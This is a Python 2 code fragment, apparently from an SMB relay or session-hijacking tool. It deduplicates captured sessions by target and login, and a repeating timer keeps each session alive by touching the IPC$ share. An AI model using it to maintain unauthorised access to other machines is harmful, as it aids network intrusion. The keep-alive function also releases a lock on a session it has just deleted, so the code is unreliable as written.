        match       = False

        for _, existing_client in server.getSessions().iteritems():
            cli_target  = existing_client.get_remote_host()
            cli_login   = (existing_client.domain.decode('utf-16le') +
                          "/" +
                          existing_client.username.decode('utf-16le'))
            if cli_target == con_target and cli_login.lower() == con_login.lower():
                match = True
                break

        if match:
            logging.warn("Skipping existing session for %s (%s)", con_target, con_login)
            client.killConnection()
        else:
            utils.commander.tui.shell.output_success("New session established on %s (%s)" 
                                                     % (con_target, con_login))

            sess_id = len(server.clients)
            server.clients[sess_id] = client

# Taken from https://stackoverflow.com/questions/474528/what-is-the-best-way-to-repeatedly-execute-a-function-every-x-seconds-in-python
# Thanks https://stackoverflow.com/users/624066/mestrelion
class RepeatedTimer(object):
    def __init__(self, interval, function, *args, **kwargs):
        self._timer = None
        self.interval = interval
        self.function = function
        self.args = args
        self.kwargs = kwargs
        self.is_running = False
        self.next_call = time.time()
        self.start()

    def _run(self):
        self.is_running = False
        self.start()
        self.function(*self.args, **self.kwargs)

    def start(self):
        if not self.is_running:
            self.next_call += self.interval
            self._timer = Timer(self.next_call - time.time(), self._run)
            self._timer.start()
            self.is_running = True

    def stop(self):
        self._timer.cancel()
        self.is_running = False

def keepAliveTimer(server):
    logging.debug('KeepAlive Timer reached. Updating connections')

    for index, session in server.getSessions().iteritems():
        if session is None:
            continue

        session.lock.acquire()

        try:
            connection = SMBConnection(existingConnection = session)

            connection.setTimeout(5)

            tid = connection.connectTree("IPC$")
            connection.disconnectTree(tid)
        except NetBIOSTimeout:
            logging.error('Session %s died, removing...', index)

            server.clients[index] = None

            del session
            del connection

        session.lock.release()

